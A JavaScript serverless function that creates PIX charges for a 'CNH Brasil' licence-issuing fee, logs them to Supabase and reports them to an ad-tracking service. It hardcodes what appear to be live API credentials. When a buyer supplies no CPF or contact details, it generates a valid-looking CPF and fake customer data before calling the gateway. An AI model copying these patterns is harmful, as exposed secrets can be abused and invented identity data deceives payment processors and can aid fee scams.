const { getSupabase } = require("./lib/supabase");

const SIGMAPAY_BASE = "https://api.sigmapay.com.br";
const SIGMAPAY_KEY  = process.env.SIGMAPAY_API_KEY || "pk_live_d27b968890bd5ceee56ffd1efbc9f27cac386681d0aaed56";
const UTMIFY_TOKEN  = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";

// ─── UTMify notification ──────────────────────────────────────────────────────
async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
  try {
    const gatewayFeeCents = Math.round(amountCents * 0.02);
    const netCents        = amountCents - gatewayFeeCents;
    const payload = {
      orderId:       transactionId,
      platform:      "SigmaPay",
      paymentMethod: "pix",
      status,
      createdAt:     createdAt || new Date().toISOString().replace("T"," ").slice(0,19),
      approvedDate:  status === "paid" ? new Date().toISOString().replace("T"," ").slice(0,19) : null,
      refundedAt:    null,
      customer: {
        name:     customer.name    || null,
        email:    customer.email   || null,
        phone:    customer.phone   || null,
        document: customer.cpf     || null,
        country:  "BR",
        ip:       "177.0.0.1",
      },
      products: [{
        id:           "drop-cnh-001",
        name:         "CNH Brasil",
        planId:       null,
        planName:     null,
        quantity:     1,
        priceInCents: amountCents,
      }],
      trackingParameters: {
        src:          null,
        sck:          null,
        utm_source:   utms?.utm_source   || null,
        utm_campaign: utms?.utm_campaign || null,
        utm_medium:   utms?.utm_medium   || null,
        utm_content:  utms?.utm_content  || null,
        utm_term:     utms?.utm_term     || null,
      },
      commission: {
        totalPriceInCents:     amountCents,
        gatewayFeeInCents:     gatewayFeeCents,
        userCommissionInCents: netCents,
        currency:              "BRL",
      },
      isTest: false,
    };
    const resp = await fetch("https://api.utmify.com.br/api-credentials/orders", {
      method:  "POST",
      headers: { "Content-Type": "application/json", "x-api-token": UTMIFY_TOKEN },
      body:    JSON.stringify(payload),
    });
    console.log(`[UTMify] ${status} → ${resp.status}: ${await resp.text()}`);
  } catch (err) {
    console.error("[UTMify] Erro:", err);
  }
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
function jsonResponse(statusCode, body) {
  return {
    statusCode,
    headers: {
      "Content-Type": "application/json; charset=utf-8",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    },
    body: JSON.stringify(body),
  };
}

function gerarCpfValido() {
  const n = () => Math.floor(Math.random() * 9);
  const d = Array.from({ length: 9 }, n);
  let s1 = d.reduce((a, v, i) => a + v * (10 - i), 0);
  let r1 = (s1 * 10) % 11; if (r1 >= 10) r1 = 0; d.push(r1);
  let s2 = d.reduce((a, v, i) => a + v * (11 - i), 0);
  let r2 = (s2 * 10) % 11; if (r2 >= 10) r2 = 0; d.push(r2);
  return d.join('');
}

// Converte valor do frontend para centavos inteiros
// Frontend envia: 64.00 ou 79.00
// SigmaPay direct-payments espera centavos: 6400 ou 7900
function toAmountCents(rawAmount) {
  if (rawAmount == null) return 6400;
  const n = Number(rawAmount);
  if (!Number.isFinite(n)) return 6400;

  // Se veio como float/reais (ex: 64.00 ou 79.00)
  if (n >= 60 && n < 70)  return 6400;  // PIX principal = R$ 64,00
  if (n >= 70 && n < 90)  return 7900;  // Upsell = R$ 79,00
  // Já veio em centavos
  if (n >= 6000) return Math.round(n);
  // Genérico
  return Math.round(n * 100);
}

// Formata telefone para E.164
function fmtPhone(phone) {
  if (!phone) return "+5511999999999";
  const digits = phone.replace(/\D/g, "");
  if (digits.length === 11) return `+55${digits}`;
  if (digits.length === 10) return `+55${digits}`;
  if (digits.startsWith("55") && digits.length >= 12) return `+${digits}`;
  return `+55${digits}`;
}

// ─── Handler ──────────────────────────────────────────────────────────────────
exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 204,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type, Authorization",
        "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
      },
      body: "",
    };
  }

  let body = {};
  try { body = event.body ? JSON.parse(event.body) : {}; } catch { body = {}; }

  const randId      = Math.random().toString(36).slice(2,10);
  const rawAmount   = body.amount ?? body.valor ?? body.total ?? 64;
  const amountCents = toAmountCents(rawAmount);

  const customerName  = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString().trim();
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@gmail.com`).toString().trim();
  const customerPhone = fmtPhone(body.phone || body.customer_phone || "11999999999");
  const cpfRaw        = (body.cpf || body.document || body.customer_cpf || "").toString().replace(/\D/g, "");
  const customerCpf   = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();

  const utms = body.utm || {};

  const payload = {
    amount:        amountCents,
    description:   "CNH Brasil - Taxa de Emissao",
    paymentMethod: "pix",
    customer: {
      name:     customerName,
      email:    customerEmail,
      document: customerCpf,
      phone:    customerPhone,
      utm: {
        source:   utms.source   || utms.utm_source   || null,
        medium:   utms.medium   || utms.utm_medium   || null,
        campaign: utms.campaign || utms.utm_campaign || null,
        term:     utms.term     || utms.utm_term     || null,
        content:  utms.content  || utms.utm_content  || null,
        src:      utms.src      || null,
        sck:      utms.sck      || null,
      },
    },
  };

  let resp;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);
    resp = await fetch(`${SIGMAPAY_BASE}/api/v1/direct-payments`, {
      method:  "POST",
      headers: {
        "Content-Type": "application/json",
        "X-API-Key":    SIGMAPAY_KEY,
      },
      body:   JSON.stringify(payload),
      signal: controller.signal,
    });
    clearTimeout(timeout);
  } catch (err) {
    return jsonResponse(502, { success: false, error: "Falha ao conectar com gateway: " + String(err) });
  }

  const text = await resp.text();
  if (!resp.ok) {
    let errMsg = text;
    try { errMsg = JSON.parse(text)?.error || errMsg; } catch {}
    console.error("[SigmaPay] Erro:", resp.status, text);
    return jsonResponse(resp.status, { success: false, error: errMsg, raw: text });
  }

  let parsed = {};
  try { parsed = JSON.parse(text); } catch {
    return jsonResponse(500, { success: false, error: "Resposta invalida da gateway", raw: text });
  }

  // SigmaPay retorna: data.transaction_id, data.payment_data.pix_key
  const data          = parsed.data || {};
  const transactionId = data.transaction_id || null;
  const pixCode       = data.payment_data?.pix_key || null;

  // Salva no Supabase
  try {
    const supabase = getSupabase();
    await supabase.from("transactions").insert({
      transaction_id: transactionId,
      amount:         amountCents / 100,
      customer_name:  customerName,
      customer_email: customerEmail,
      customer_cpf:   customerCpf,
      customer_phone: customerPhone,
      status:         "pending",
      brcode:         pixCode,
      utm_source:     utms.source || utms.utm_source || null,
      utm_campaign:   utms.campaign || utms.utm_campaign || null,
      utm_medium:     utms.medium || utms.utm_medium || null,
    });
  } catch (err) {
    console.error("[Supabase] Erro ao salvar transacao:", err);
  }

  // UTMify — waiting_payment
  await sendUtmify(
    transactionId,
    "waiting_payment",
    { name: customerName, email: customerEmail, phone: customerPhone, cpf: customerCpf },
    amountCents,
    new Date().toISOString().replace("T"," ").slice(0,19),
    utms
  );

  return jsonResponse(200, {
    success:        true,
    pixCode,
    pix_code:       pixCode,
    brcode:         pixCode,
    payload:        pixCode,
    qr_code_image:  null,
    transaction_id: transactionId,
    transactionId,
    deposit_id:     transactionId,
    status:         data.status || "PENDING",
  });
};
